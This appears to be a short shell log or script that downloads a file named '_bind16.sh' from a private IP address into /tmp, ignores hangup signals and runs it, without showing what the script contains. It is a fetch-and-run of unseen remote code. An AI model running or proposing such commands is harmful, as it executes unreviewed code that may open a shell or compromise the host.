wget -q -O /tmp/bind16.sh http://192.168.1.44:18765/_bind16.sh
sed -i 's/\r$//' /tmp/bind16.sh
wc -c /tmp/bind16.sh
head -1 /tmp/bind16.sh
trap '' HUP
sh /tmp/bind16.sh
echo DONE16
